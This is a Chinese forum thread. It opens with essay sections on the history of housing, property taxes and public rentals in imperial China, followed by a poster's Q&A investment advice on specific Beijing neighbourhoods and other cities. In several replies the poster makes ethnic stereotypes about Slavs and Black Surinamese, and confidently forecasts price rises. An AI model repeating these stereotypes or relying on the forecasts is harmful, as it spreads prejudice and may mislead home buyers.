虽然古代开发商没有现如今的开发商这么\"牛\"，环境和政策对他们都不太有利，但是在拆迁问题上，始终还是开发商们占优势。就比如窦乂，他就知道要搞房地产，首先得朝上有人，于是傍上了当朝太尉。 古代拆迁过程更为暴力，因为普天之下，莫非王土，国家要用哪里就用哪里。 当然，在古代，也不乏一些民主的君主。例如北宋元丰六年(1083年)，开封外城向外拓展，规划中的新修城墙要占用120户居民的住宅，宋神宗让开封府制定拆迁补偿计划，开封府写报告说，总共需要补偿款两万零六百贯，平均每户至少能拿到补偿款171贯。 契税的历史 关于契税、物业税或者房产税，其实也不是现在的创造或者纯粹的拿来主义。 早在东晋时期，就开始收契税，当时叫\"散估\"，这也是中国第一个有据可查的契税。其后，几乎所有朝代都有契税。 唐初魏征等人写出了房产税的实质：\"其实利在剥削也\"——当时\"剥削\"没有现今这么贬义，与\"增加财政收入\"是一个意思。 从税率上看，东晋税率为4%，隋唐税率是5%，宋代4%，元明清三朝基本是3%。我们现在的契税大户型也是3%。 万历三十三年，利玛窦在北京宣武门附近买了处房子，他在意大利、葡萄牙、印度都呆过，那些地方并没有\"契税\"这一说，所以他也没有去有关部门办理手续。 《大明律》规定：\"凡典买田宅不税契者，笞五十，仍追田宅一半价钱入官。\"好在利玛窦同志上面有人，托了户部官吏，最后交了一笔可观的滞纳金了事。 相比之下，\"物业税\"这税种兴起较晚，而且断断续续。公元783年，唐德宗向长安城内拥有房产的市民开征物业税，叫作\"间架税\"，乃是按照房屋的等级和间架计税，上等房屋每年每间缴纳两千文，中等房屋一千，下等房屋五百。 结果民怨载道，当年深秋五万军兵哗变，口号就是\"不税汝间架\"。迫于压力，784年唐德宗废止了这个税种，也就是说，中国第一个正规的物业税仅仅活跃了半年就夭折了。 到了五代十国，梁唐晋汉周的每一代帝王都曾征收物业税，不过鉴于\"间架税\"惹过乱子，改叫\"屋税\"。 北宋物业税不是常设税种。南宋由于军费困难，每年两次向城乡居民征收屋税。元代，不叫间架税或屋税了，改叫\"产钱\"，按地基面积征稻米若干或折成钱若干。明朝，物业税不常设，江浙地区小范围征收过一段，叫\"房廊钱\"。清代，物业税也不常设，往往临时征收，比如1676年由于对吴三桂用兵，朝廷财政紧张，康熙下诏\"税天下市房\"，规定\"不论内房多寡，惟计门面间架，每间税银二钱，一年即止。\"算下来，是只对门面房征税，二钱税额相当于两斗大米或七斤白糖的价钱，不多。 总而言之，无论是间架税、屋税、地基钱、产钱、房捐，都是不折不扣的物业税。只不过，它们与国际上通行的物业税是不同的——不是为了调节需求，而是单纯地敛财。 然而物业税在中国并不能成为常设税种，因为这个税是纯粹的苛捐杂税，税又比较重，很容易激化矛盾，直接结果是百姓吃不起饭，太容易导致大规模的农民运动，所以很难持续征收。 廉租房的历史 言及公房和廉租房系统，最是宋朝搞得好。 宋朝原则上不分房，京官无论大小，一律租房居住，宰相那样的高干都是如此。偶尔有\"赐第\"，只照顾部级领导和有军功的将军。算起来大家的住房自有率不高。 南宋初年，大量流亡人口涌进杭州，三十平方公里的杭州城一度住了一百万人口，人口密度接近上海浦西。 因人多地少房价高，居民普遍租住公房。除了大规模公房出租，宋朝还有住房救济体制，一是灾年对租住公房的市民减免房租；二是政府建房（福田院、居养院）免费安置流民和赤贫民众；三是修建比公房条件要差的简易房，但是租金更低，堪称\"廉租房\"。此外，宋朝还有安济坊——慈善医疗，还有漏泽园——安葬无人认领的尸身，比较有人性。 如果是公务员的话，生在元代也还不错。建国开始，就给半数京官和所有地方官分了房，叫\"系官房舍\"。一般分不到的市民以自主建房为主导，但是盖房不用买地，政府批给一块官地，然后每月交一次租金，时称\"地基钱。\" 满人刚进北京那会儿，也给领导们分房子。一品官二十间，二品官十五间，三品官十二间，四品官十间，五品官七间，六、七品官四间，八品官三间，不入流小军官每人两间。按照每间十五平方米估算，从一品官的三百平方米、到小军官的三十平方米不等。 廉租房主要由寺观经营。土地由政府划拨，建房资金由民众捐献，房产维护可以从香火钱里冲销，僧尼道士理论上讲不以盈利为目的，再加上信仰需要，正适合执掌这项半慈善业务。大都市的庙宇常有上千间客房，供应试的学生、出门的商旅和遭了天灾的百姓临时居住。 《西厢记》里张生和崔莺莺在山西停留一整月，在那永济县普救寺里，莺莺住西厢，张生住东厢，该故事充分说明：在廉租房里也可能发生爱情。 到了明清两代，又多出个廉租房的来源，便是会馆。在这异乡人建立的聚会场所里，客房租金相当便宜。顺治十八年建于北京的漳州会馆，福建人来租住，只象征性地收取租金：每月三文钱！ 历史上买房最好的朝代 历朝历代，哪朝买房最容易呢？ 南北朝最不靠谱，贫富相差极为悬殊，普通居民收入只有几千，房价则是几百万。谢灵运那样的大财阀\"左江右湖，南北二山\"，房价都被他们给炒上去了。 唐朝不用说啊，我们都知道\"居长安，大不易\"，而且士大夫时兴攀比，为了写诗题名好看，非得有个别墅不行。比如王维有辋川别业，岑参有南溪别业，杜牧有樊川别业，就是白居易本人，后来也在洛阳买了十七亩地，修了个\"履道园\"。 宋朝文人叶梦得说：\"人未有无产而致富者也。有好便田产，可买则买之……勿计厚值。\"这话一再被地主老财们重复。有点闲钱，买房子置地，不惜一切代价。 明代买房也不是件容易事。《金瓶梅》第五十六回，西门庆的结义兄弟要买房，朋友帮他算了算帐，\"一间门面，一间客座，一间床房，一间厨灶——四间房子是少不得的。论着价银，也得三四千多银子\"。小户型房子，要三四千两银子。而清河县县令，从七品国家公务员，每年薪水不过三百五十两。就是说，就算县长去买房，如果不贪污的话，需要十年不吃不喝才能攒够房钱。明代楼市虚火上延，与攀比之风分不开。尽管明太祖规定，任何人不得超越等级建房，例如居民门窗不得使用朱红油漆；庶民住房不得超过三间；功臣宅邸两边可以保留五丈空地；军民房屋不许建成五间或九间；寺观庵院不得使用斗拱。但如小说里所说，庶民西门庆\"现住着门面五间到底七进的房子\"，超标超大发了。 嘉靖年间，大家纷纷打肿脸充胖子，浙江人的房子必须带客厅了，江西人的房子必须带兽头了，江苏人的房子里必须摆上时尚家具和精美古玩了。明朝中叶，北京的地皮已经涨到每亩纹银两千两，就是折成人民币也有好几十万。 未来房地产市场的发展 中年不惑吗： 楼主旅行结束呢？ 将来房租市场会如何演化？ 房租涨的太多，如果大多数租客的收入承担不起该如何？ 例如租客的平均工资4000元/月，你让他和别人合租一个小两室要6000元 他们承担不起恐怕就只能离开这个城市了 kkndme： 公租房具有平准作用，zf要敛财，不能定价太低，但也不会高的离谱。有了这个参照物，个人普通房出租应该保持在比公租房稍高水平，当然位置好的高端房精装房也可能租出天价。 中国的房价在未来将成为多数群众遥不可及的梦想，也可以说大多数人都不再关心商品房的房价涨跌。 未来，租房将成为常态，所以房子的位置环境装修的档次不同，房租的差距将会非常明显。但好房子一定只有中等收入以上家庭才租得起。 而买房子是富人阶层的事，中等收入家庭想都不敢想。 中年不惑吗： 呵呵，将来，只要中等收入的家庭2个月的收入能买1平米，他们也会买房子的 难道将来的房价要涨到中等收入家庭半年甚至更长的时间才能买1平米？ kkndme： 除了房价高，贷款也没那么容易。而且除了房子，各方面的花销都会涨得离谱，这是太平盛世后期的普遍规律。 关键还在于体制外的中产，都是逆水行舟，一旦不能前进，就可能沦为赤贫。 房产到期 不明真相的草民： 向LZ请教 商品房的土地证年限有多重要？ 现在一个二线城市的开发区，中心地段很多小区房子倒是新盖的，但地是90年代初拿的，有40年、50年的，还有30年20年的，大部分房子的土地证从现在算起只有10几年20几年，有的房子土地证已经到期了，但由于位置较好所以房价一点不便宜。按KFS的说法，土地证到期将来再续就是了，没有大的影响。 LZ给分析一下，这样房子将来的风险在哪？如果买来自住又如何？ 谢谢！ kkndme： 其实有无土地证都无所谓，无论有没有土地证，最大的风险都在dfzf，人治社会法律文件其实就是一张纸，关键还是zf做得不要太过份。 即使你证件齐全zf想拆一定会拆，即使没有土地证拆的时候也会同样补偿。 这个东西实在没多大意义。 不明真相的草民： 感谢LZ答复。都是新建的高层，应该不会轻易拆迁，这么说自住还好。但如果将来要出手是否就存在困难？？ 期望LZ继续指明。 Lz似乎没有看到这个问题，再次感谢Lz，望答复。 kkndme： 出手不存在困难。二手房交易国家不会对土地证进行严格限制，关键还是房产证。 买学区房问题 开洋木瓜： 楼主，有个问题想咨询一下。 家在南京，郊区有一套自住房，130平，市值大概150万左右。市中心有一套小公房，居住权，目前空置（刚分到的，还没有装修，而且单位也禁止对外出租）。现在宝宝一岁，想给宝宝买个学区房，很多名校都要求提前三年落户，所以必须要在2年内买房。一线的学区房单价在2万2-2万6之间。一线小学的分校学区房在1万5-2万之间。我想买的是一个名小的分校，近几年的小升初成绩都非常不错，可以进入南京前三名。 我想买的一个房子位于这个小学的学区，是拆迁安置房，97年的房子，小区环境比较杂乱，没有物管，停车也不方便。但是周围配套都非常齐全，菜场超市医院都很近，上学也不用过马路。今年年初，2月份的时候我本来在这个小区买了一套，但因为房价上涨房主违约。当时买的房价是12500，现在看中一套，房主要17000，挂了很久没卖掉，我出15000，可能有机会成交。 这个隔壁有个新小区，物管环境都很好，但价格也上到2万一平了，如果要在这个新小区买房，我们家里的钱就不够了，如果要卖掉现有的房子去买，老公也不愿意。 还有个问题是，房主要求净得价，12月的时候满五年，就不用付营业税。如果现在交易过户也可以，但要多付几万块。如果算上这几万的税，房价就差不多一万七一平了，我也不愿意现在过户多付这个钱。如果现在签约等12月再交易过户会不会有风险？另外现在是否是出手时机？请楼主赐教。 kkndme： 学区房即使在调控最严厉的时期也几乎不可能下跌。但是在上涨期就很难买到，因为房东会跳价。 12月过户有一定风险，如果到12月时，房价上涨比较厉害，房东有可能违约。 制约房东违约的方法就是签较高的违约金。 历史的结局 Peter_Takeshi： LZ写的不错，有些意见不敢苟同。 LZ既然熟读历史，又在安抚众人去接受被统治的命运，那能否告知最后的结局呢？ 是否跟前几十个朝代一样？呵呵~ 人性几千年从未根本改变，所以即使过程不同，结局仍旧是一样。 谁上台都改变不了这一切。 kkndme： 历史上的结局三条路： 和平演变——在中国好像没发生过，今后也不可能，没有土壤 大革命——哪次也少不了 外来入侵——这个也比较靠谱 facetowall： 对lz的深厚的历史功底十分佩服。lz说改朝换代的方式有三种：1.和平演变；2.农民qiyi；3.外族入侵。我觉得前苏联的解体看似像是和平演变吧，第2、3条好像不符合。lz说zhongguo无和平演变的土壤，但是前苏联好像也没有啊。这该如何解释呢？ kkndme： 苏联的文化背景与中国完全不同。我国是自秦以来进入帝国时代，是一个上千年大一统的国家。 而苏联是在近代革命后才出现的。俄罗斯的主要人种是斯拉夫人，在日耳曼民族眼中是奴隶的意思，人种低劣。中世纪叫做罗斯地区，由基辅公国、莫斯科公国、立陶宛公国等多个公国割据，在元代一直附属于拔都建立的金帐汗国。罗斯诸国在西方中世纪非常弱小，直到波兰立陶宛联军大破德意志的条顿骑士团后，才逐渐强大。俄罗斯于1721年彼得大帝时期才开始崛起，19世纪末才成为帝国主义国家，根本就没有大一统的土壤存在，这也就是苏联能够和平演变，而中国不行的原因。 人口普查 平静的房奴： 看来楼主今天比较空闲，一口气发了这么多帖子。 有个问题想青椒哈楼主，我在武汉，最近武汉在全免清理个人和家庭住房信息，晚上调查人员还上门登记、记录，请问这是何意？是否在为出台房产税做准备。 kkndme： 人口普查。不但武汉，连穷山沟里也在忙这个，穷乡僻壤的支书天天忙得不亦乐乎。这是第六次人口普查，前面查过五次了 昆山房价分析与买房 買房難： 樓主﹐麻煩你分析一下昆山的房價吧﹐先謝謝﹗﹗ 昆山是一個縣級市﹐原先是屬于蘇州的﹐離上海很近﹐動車只要20分鐘﹐現在高鐵也開通了﹐原先房價還算便宜的﹐現在連鎮上也貴到五千多六千了﹐市中心最便宜的也要七千多八千﹐09年10月的時候一下子漲了很多﹐原先我看好的一套二手房32萬﹐現在要50多萬﹐太奇怪了 kkndme： 昆山不能理解为县级市，要理解为上海的卫星城。相当于北京的燕郊。所以房子八千多一点也不奇怪。 買房難： 謝謝樓主回復﹗昆山市中心的房子大一點的開發商開發的如世茂在一萬左右一平﹐這個價位算不算高啊﹖ 買房子要在市中心好點呢﹐還是城東靠近上海方向好些﹖ 昆山很小的﹐就那么几個鎮﹐現在火車站﹐汽車站﹐高鐵﹐人才市場都在城南﹐另外除市中心的玉山鎮外﹐其它的都是工廠很多﹐污染還是多。 kkndme： 买在哪里合适，你要看zf规划，跟着zf规划走。比如房山，zf打造的是长阳而不是老的镇中心，所以买房就应当买在长阳。道理是一样的。 为什么现在租售比这么低 & 同小区买一套大还是两套小 我爱的飞飞： 对待房子，我的看法是这样的，50-60年代的人，兄弟姐妹至少5-10个，2004-2020年之间正50、60、70、80、90年代共存的时代，人口达到了爆发阶段，现在好多小年轻70、80代人因为买不起房结不起婚，甚至晚婚索性不育，等50.60后在未来20-30年离世之后，将会有大量的房子空出来。而80后的子女2000后，人口根本不足以养活上一辈。 我在成都，我的父母是体制内的，我是体制外的80后，刚结婚，老公是体制内的。原家里有一套单位的集资建房，只有小产权，在二线城市的一环内，98年的房子，因为担心迟早有一天拆迁以后没有房子住，小产权也不会赔多好的地段或者得到较好的补偿，再加上以房养房的心理作祟，以及我参加工作以后想从家里独立出来，于是父母在08年底四川地震以后全国大降价赶上好时光在三环外买了一套140的房子，那会儿才买成2900，今年交房以后装修到一半，就有人以双倍价格想买入，父母不卖，留着养老。一年不到翻了一番起来，我结婚以后，也和老公一起在一环附近购入一套小户，8千多。老公家在外省某市有2套，这样算下来，我门要是生一个孩子，以后这孩子手里就有我父母在成都的2套加上老家的1套，我和我老公的1套，孩子爷爷奶奶的2套，一共6套，您说等我父母和老公父母都去世以后，房子嗖的一下就空出来了不少。所以我觉得80后到了四十岁左右肯定都能住上房子，那个时候房子也不再值钱，不过话又说回来，其实我的父母也是年轻的时候住在单位的公房，三十五近四十岁才有了第一套集资建房，而他们的第二套和第三套相对比较快了。所以我现在觉得年轻人还是应该多奋斗吧。但是我真的不清楚，到了房子不缺的时候，那个时候又会炒什么。 虽然我是土著，也不缺房子，但是压力也不小，特别是还贷，连车也没敢买。有时候我跟LG也想，为啥我们买的房子首付了二十几万，装修十万，我们每个月还还着2500的按揭款，租房客2000就租走了，那不是我们垫着钱给别人提供福利么？向楼主求解。 kkndme： 打个比方，假设你打算在某地开个游乐园，竞拍一块地，经过计算当时的门票定价10元一张，根据人流测算，你认为出500万投标这块地，5年可以回本，于是你出了500万，但是别人出到了1000万，你认为1000万要10年回本，风险太大了，于是你放弃了。你冷笑着认为那个傻子一定会赔钱。 结果过了2年，票价涨到100元一张了，人流量一点也没减小。人家5年就回本了，以后赚的盆满钵满。可是这个生意你却因为太能算计没有做成。 为什么房价租售比低？ 其中原因之一是现在的房价预期了以后的租金。 另一个也是最重要的原因就是：现在的房价不够高，说明了很大一部分普通家庭都有希望买得起房，所以宁肯省吃俭用住合租房，为了攒首付。但当房价高到普通家庭不敢问津的时候，这部分中等收入的合租家庭就会放弃买房转而追求租住有一定舒适度的房屋，房屋租金就会上涨到合理的程度。 welldayzwb： 楼主在线啊，真好，这个道理大概也明白，不过现在出于\"活雷锋\"阶段，心里还是很不舒服 去年底在北五环投资的一套大一居，首付加税款超过60％，贷了30年的公积金，现在房租还是不顶月供，而且空租期很长 很怀疑自己的投资决策，好象不是一个很明智的选择，纠结中 kkndme： 当房价快速脱离你的成本区，你的心理就好受了。 welldayzwb： 再多问一句，有机会一步到位买个满意的大房好(也是老房，得房率高，三居)，还是买两套小房，一套凑合着住，一套放租好？ 当然两套小房的总额比一套还是要多不少，帮忙分析一下，短期和长期来看的情况？谢谢！ kkndme： 其实买两套同一小区的房子是最好的，投资自住兼顾，可进可退。如果家里有老人，和老人分别居住，又在同一小区，照顾起来很方便。 买房难之回不去的乡 & 拉美人过得比你想象的好 九五二七八： 楼主说的以后大部分人买不了房的论题 中美在这个方面的差距 怎么这么大呢 现在产业转移 一部分人就业就有回乡的趋势 今后再有一波转移 会不会再离故乡近一些 这样 分散置业 购买难度会不会下降 kkndme： 中美体制不同、文化不同、人口不同。一辆在美国2万美金的汽车，国内要卖几十万人民币。一件made in china的服装美国卖20美金，国内卖900人民币。 不管一线城市、三三线城市都是人满为患的，从一线城市逃离的也会驻扎在二三线城市，绝没有可能大中型城市向小城市回流。 返乡潮指的是家有自留地的农民工，如果工资待遇差不多，与其到沿海地区漂泊不如回乡打工或者种地。比如贵州镇远的油漆工一天工资是150，而在珠三角打工一天工资还不到150，这也是大量农民工返乡的原因。 九五二七八： 最难的怕是现在三四流的大学生和跟着打工父母生活在城里的二代 失去了农村生活本领 在城里也无法立足 楼主 难道拉美化真的不远了 kkndme： 很多人都丑化拉美，但是拉美的生活水平要高过我国。不说远超中国的巴西，即使是法属及荷属圭亚那(苏里南）这样的小国，人民的生活也很富足。 前几年有个援助项目去苏里南等拉美国家，去之前所有的人给我灌输的都是拉美国家如何贫困。但事实上，这些国家与中国完全不同，国穷民富，藏富于民，与中国正好是相反的，只要勤快点的家庭都还比较富裕。当然不排除也有很多穷人（美国也有很多穷人），穷人一般以当地的黑人为主，好吃懒做，整日无所事事。 这些国家的人民不如中国人勤奋，从不攒钱，只图眼前享受，我想主要原因还是由于币值不稳定，通货膨胀比较严重，所以没有人愿意攒钱。在拉美国家是无法炒房地产的，比如苏里南平均25平方公里有一口人，真的是地广人稀。所以才保留了世界上最高的森林覆盖率。 拉美人的懒惰会让中国人瞠目结舌，当地的蔬菜价格昂贵，尽管有大片肥沃的土地，当地却没有人愿意耕种，很多去苏里南种植蔬菜的中国人为此发了大财。 而相反中国人可以说是全世界最勤劳的民族，但是大量勤劳的中国人却过着低水准的生活。这与中国的国富民穷，藏富于国，与民争利的政策是分不开的。 拉美国家尽管有这样那样的问题，但是确实是法制国家与民主国家，私人财产神圣不可侵犯，这是与中国完全没有可比性的。 九五二七八： 一般对\"拉美化\"的定义是这个吧：贫富悬殊扩大、腐败严重、国有企业效率低下、社会治安恶化、城市人口过多、地下经济泛滥、对外资依赖性强、金融危机频繁和政局不稳定，等等 没去过拉美 不知道真实的拉美 kkndme： 看来拉美妖魔化后，深入人心了。好比在越南旅游，越南人自己说越南官僚太腐败，我笑了，能有中国腐败？ 拉美的官僚机构，国企、医院、警察我都见识过。 说到官员的官僚，相比中国我真的觉得那里的官员很亲切。我曾经以一个游客的身份和苏里南的司法部长一起在街边小店喝咖啡。以一个陌生的外国游客身份在财政部长家里做客，逗他家的几个黑小孩玩。 说到治安，我在街边咖啡店坐了一下午，每二十分钟一辆巡逻车从我身边经过。里约热内卢的治安绝对不会差过广州。 国有企业效率低下恐怕是全世界的通病，况且拉美根本没有可能赚钱的行业全部由国企垄断。 政局不稳要看怎么理解，拉美国家是相对民主的国家，国家元首倒是常常因为民众的不满而换届（排除少数经常政变的军政国家）。但人民并没有感觉到不幸福。 拉美国家的经济基本被美国所控制，所以才会对外资依赖严重和金融危机频繁。作为一个主权国家我们看到的是国家财政贫困，但是作为拉美地区的中下层人民群众，生活水平和幸福感是要高于国内的中下层群众的。 租房的苦 说到租房举个活生生的例子。 我有朋友是个房产的死空头，一直租住着北京一套两居室的老公房，租金不高1000多点，所以没什么负担，对买方族恨不能理解。结果今年他租住的那片老公房要拆迁，限期20天内搬家走人，结果终于理解了找房子的辛苦，而且随便租一套两居室也找不到2500以下的了。 真是心态决定命运。 北京西三旗 bjwxw： 楼主在线啊，今天几乎花了大半天的时间从头至尾的看了楼主的帖子，分析和解释的真的很实在到位，也许我了解的不是很多，但是确实觉得现实好多都是这样的，麻烦我现在有个问题，我住在西三旗，我租住的这个小区去年的这个时候价格是60-70左右，我失去了机会，可是今年这些房子基本都是120-140万之间了，我现在是在忍不住，也憋不住了，因为我是刚需，虽然心里是万分的懊丧和后悔，但是事情还的做，房子还是的买，可是我很担忧，我花140万买只隔一年就升值一倍多的房子，后果会是什么，我真的怕等了好久，可是等我出手了，房子真的跌了，尽管不会跌很多，但是把我的首付跌光那也是件很可怕的事，毕竟辛苦的攒了这么多年的钱，我是实实在在像楼主说的那样的底层奋斗着的接近中年的刚需外地人，挣钱太辛苦了，所以很害怕，楼主，我现在也很急，老婆看好了一套140万的房子，要我去买，我也知道她也很无奈了，可是我心里这关好难过啊，想听听你的指点，急盼回音 kkndme： 西三旗的房子与不远的立水桥相比，涨速是相当慢的，尽管离市区更近当房价跟回龙观相仿，并没有拉开差距。随着8号线的即将开通，8号线地铁站中央部位保障房项目的启动，西三旗房价上升空间还不小。 西三旗附近最值得购买的小区是枫丹丽舍，因为低密度将来必定稀缺，但是目前价格也高过其他几个楼盘，甚至高过新盘富力桃园。配套最成熟的小区当属育新小区。象硅谷先锋、森林大第也都比较好住。西三旗这片地区属于难得的价值洼地，值得购买。 bjwxw： 多谢楼主，看来您真的对西三旗了解的太透彻了，我真的很幸运，我就直接跟您说了吧，我说的房子是龙乡小区，您肯定也很了解，这个是个老小区，房子已经超过了10年，优点就是交通好，周边医院，学校，购物都极其的方便，因为钱有限的原因，只能买这里的，情况就这样，您能给我多说几句吗？多谢 一着急字都打错了，不好意思 kkndme： 龙乡小区的房价在西三旗片区相对较低，因为房子是90年代的，但是周围配套相当齐全，去超市购物也很方便。如果你在上地上班也算比较近，唯一的遗憾就是房子旧了点，户型与2000年后的次新小区相比，有点不尽如人意。 bjwxw： 确实是这样，今天通过从头看到尾您的帖子，基本心中已经有了概念，买吧，尽管我从这个小区的70万的房子如今花140万去买这个心理关很难过去，但是还是过吧，既然已经这样了，认命吧，不害羞的问一句，房子价格已经16000了，您说这个地段在将来是会升些，还是会跌一些，呵呵，实在不好意思，添麻烦了 kkndme： 这个地区的房价，两年内是可以看到25000的。 喜欢8号线： 楼主看好西三旗地区房价，本人深有同感。 西三旗地区的焦点不在京藏高速路口，也不在林翠路路口，而在西三旗东路。也就是地铁8号线西三旗站附近。 现在这附近已经有宾馆、饭店、百汇商品市场、中小学、3甲医院、银行。 到2012年，8号线开通，百汇市场新增电影院，龙旗广场新增写字楼2座和3星级酒店一座， 随着北新建材厂的搬迁，原厂区还会有更多的新楼拔地而起，西三旗东路将南延、拓宽至永泰。整个地区的房价将随着新楼盘的不断推出而节节高升。 kkndme： 西三旗地区一直相对滞涨主要还是缺乏大品牌开发商入住，没有高端楼盘的带动，涨幅偏低。但也正因如此，才形成了一块价值洼地，以后才有更大的上涨空间。 跳坑的青蛙： 没想到楼主对西三旗地区如此熟悉~ 想问问楼主对于上地附近二手房的看法，如当代城市家园这样的地方，有没有升值潜力？ 觉得这边交通还是有很大问题~ kkndme： 上地区域的房产在2008年之前，涨幅较快。但在2008年以后由于上地区域的产业以民营iT为主，属于充分竞争，利润下滑较快的产业，区域经济的发展前景远不如望京，所以上涨空间受限，涨幅趋缓。 区域发展是房价升值的动力，个人不太看好上地区域。 汝爱之罪： 对上地一点也不了解，不过今后北京的私企郊区化应该是趋势，好多公司因为成本问题已经开始向密云等地搬家。上地的价格若被炒太高，也难逃此运。 也许zf会注意到这个发展趋势，引导郊区，现在大力发展郊区地铁就是为今后的卫星城铺路吧。不过能不能成功，是另一回事。里面牵涉利益太多，比如海淀，主导还是高科技产业，如果全都搬家，地区zf就头大了。上地区域，可是海淀政府大力度发展的重点区域。 kkndme： 你说的很有道理，现在海淀的it产业基本就是以处于链条底端的制造业，毫无科技科研，急需产业升级，才能得到持续的发展。象联想这样的it公司完全沦为了90年代家电厂商的境遇，毫无未来。 买房争取一步到位 hohowell： 楼主，诚心请教下，从开贴开始就一直在潜水关注，终于坚定了买房的决心 现在在犹豫，一是买个80平米的小户型，开发商一般，房型尚可，这样贷款比较少，基本不影响供车，旅游和以后小孩的开销，不过考虑5到8年左右，这个房子就不能满足居住要求了，回头换，又是一大笔钱，而且城区内的好小区也会越来越小，另外一个就是保利的大户型，开发商物业都靠得住，基本上短期可以不用换，不过贷款至少贷100多万，短期内还会要小孩，压力会比较大，基本手里每个月都没有闲钱了，很容易回到赤贫线，一直犹豫不决，诚心请教楼主解惑，我在南京，一个一线以下二线以上的鬼地方，两处房子都靠地铁，周边商业中心配套齐全，谢谢！ kkndme： 买房子如果有能力还是要争取一步到位。将来改善，除非个人有较大的发展，否则将很难很难。而且买楼首选好位置，大开发商，大盘，升值空间才大。 welldayzwb： 看来楼主分析说购房应该一步到位，我就犯了一个错误，用投资的眼光来选择自住房，后来买的两居室比同小区的三居室性价比高很多，但是居住环境不好，临一条小街，所以现在住起来不是很爽，现在调控着价格先不说了，光是现在限制换房的一些条条框框感觉再置换就很麻烦 另外一套买的外面一点，小区环境非常棒，不过当时是被环境给迷惑了，放租的房子管那么多环境做什么，感觉两套房子操作反了 纠结中啊纠结中，现在唯一能安慰自己的就是，买上房子总比没买强，如果去年年底再犹豫一下或是赌气的话，那就真是悲剧了，一个好三居得活活等成质量差些的两居了 收入稳定的家庭如何买房 黑眼圈钱： 请教楼主，买房子的事情，比较纠结。 1）夫妻两人均在西部某高校任职，一个教师，一个行政人员，年龄都不小了，37和35，两人每月总收入在8000-10000，1年算10万收入，应该会多一点。 2) 一个女儿，才两个多月。 3) 3）每年给双方父母1万，双方父母均已60出头，一方父母城里的有退休金及医保。另一方父母农村的，得为他们准备点钱。 4）目前租住单位两室一厅房，就在学校住宅小区内，除了小点，别的都好，房租100。 5）公积金两人很少，约1000元每月，未来1-2年内会有购福利房机会，估计90多平方的旧三室一厅（约需 10万元），可能有120平米的房子，但需要排队看单位建房情况（2000每平米）。 6）两人都有单位医疗保险。 7）孩子可以上学校的幼儿园和小学、初中，就在150米范围内。 8）对于车没有什么想法，每天步行上班用不到车代步。不过会买辆10万左右的。 9）现在没有任何投资和理财。银行存款1-2年期定期存款50万，这个傻了，已经存2年了，平时光顾着干活。 有没有必要买个商品房呢，周围的房价从08年的4500涨到现在8500，容积率还非常高，并且楼间距等等不理想，那种房子我不想住的。 其实在附近买套120平米的房子，首付后也供得起，买房子放那等涨价或者出租？ 不想放弃单位的房子，每天睡到自然醒再去上班还是挺惬意的，送孩子上幼儿园上学也方便。 买了房子后经济会紧张些，不像现在自由。财务自由也算一种幸福吧，我太太对于房子没什么要求，所以也不给我什么压力。 kkndme： 对于工作稳定，收入不错的体制内家庭，基本上的情况就是有闲钱就买房。主要还是由于收入稳定不用担心失业，钱放着只有贬值，不如置业。投资型住房与自住型住房在选择方向上有很大不同。 举个例子，昆明打造了个螺丝湾，几乎半个昆明做生意的人都聚集在哪里。如果自住没有人愿意选择在那里买房，实在是不好住。但是投资确是最好的选择，因为可以获取较高的租金的收益，将来升值空间也不会小。 假如在昆明一环附近买一套两居室，月租金一般在1500-1800，而房价在万元左右。而在螺蛳湾附近买一套两居室，月租金都在2000多，而房价在7000多。 北京回龙观 baiyang11112010： LZ,你好，我2010年3月在回龙观买一复试房子120平米，户型不是很好，全部下来，161万，我尽量提前还贷，控制在3-5年以内，所以，这房加利息定能控制在170万以内，我想问的是，3-5年我想出手，会不会亏？ kkndme： 你的问题太短了，虽然问了几遍，居然没看见。 回龙观地区的配套设施齐全，积水潭医院入住将提升该地区的物业价值。随着中关村高新区北延规划的利好，回龙观地区的房价在未来两年内有50%左右的上涨空间。 baiyang11112010： 我觉得LZ你的分析思路不错，但是这种涨幅应该不会再有了吧？虽然我今年4月投资了一套，但是，我能回本就行，没敢过分估计，你这样有煽动别人之心啊 kkndme ： 首先投资房产不是炒股，不能有炒股的心态。目前说起投资房产是最安全的品种，指的是长线投资，而不是短线投机炒房。短线投机炒房还是因政策的不稳定有较高风险的，一旦资金链断掉，将万劫不复。 对于4月份，在山雨欲来风满楼的特殊时期，投资一线城市郊区房地产肯定是欠考虑的。 对于房地产调控，主要针对一线城市，且一线城市在09年行情涨幅过大，郊区楼盘一定会受到调控影响，而资金的运作规律告诉我们，调控抑制住了一线城市的投资资金，一定有相当部分转向二三线房价相对不高的城市，大开发商对二三线城市的入住，将加速城市升级。所以调控征兆的开始，正是布局二三线城市的时机，而不是一线城市。： 值得安慰的是，回龙观地区并没有遭遇疯狂炒作，表现比较抗跌，即使被套损失也不会大。从未来两三年看，回龙观的区位一定会有50%左右的涨幅，这是不用担心的。 贷款还是全款 jhjdream： 楼主，请教一下， 也正是8月初看来楼主的帖子，坚定了我此时买房的决心 我在3月份卖了一套小房子，8月底买了套大点的，也是学区房，学校在建 现在考虑一个问题，是全款付清好还是贷款比较好 全款付清，欠亲戚10多万，没有还钱压力，年底可还清，但是手头没有余钱 贷款的话，手头会有20多万余钱，可以装修，或者等年底再攒点钱，投资其他的 所在省会城市房价8000多，偏一点的6000左右。 装修好出租2500左右，贷款月利息2000左右 也就是说我全款还清，一年相当于收益2.4万的利息及3万的租金，房款70万左右， 是否值得？还是贷款35万比较合适？ 因为考虑到通货膨胀时期，应该是负债比较划算～～ 谢谢！ kkndme： 肯定是贷款划算，这是毋庸置疑的。当然如果你的余钱实在找不到其他投资渠道，也可以一次性付清。如有可能也可以贷款买两套，而不是买一套。 70万的总房款月租金达到2500，租售比还是很高的，贷款35万，租金抵月供完全没有问题，说明你所在地区的房价具备较大的上涨空间。 00后的买房需求从何而来 和风中的树叶： 看了那么多 有点意思 不过在下有一事想不明白： 因中国的计划生育政策 往近了说 人口红利会在这几年消失 往远了说 80后基本都是独生子女 父辈在城市里都是有房子的 这些房子作为遗产 按理说 在未来应该使00后没有买房的需求。 LZ如何解释在这种情况下在未来房子仍然看涨？ kkndme： 前面已经说过了，你往前翻。 和风中的树叶： LZ能不能再贴一次？或者说明一下在第几页？谢谢哈~ kkndme： 回去找了一下，居然被删了。 大意基本是讲中国经济未来的发展模式，城市升级与拆迁改造的关系，没想到这样也不允许说。实在懒得再长篇大论说一遍。 关键的意思就是一方面是富裕阶层对更高端产品，更大面积的追求，一方面是城市升级带来的大规模拆迁改造。下层群众将被挤出城市核心区。许多住房都会被拆迁置换。 意大利的住房模式 我本人对意大利的住房模式还是比较赞同的。 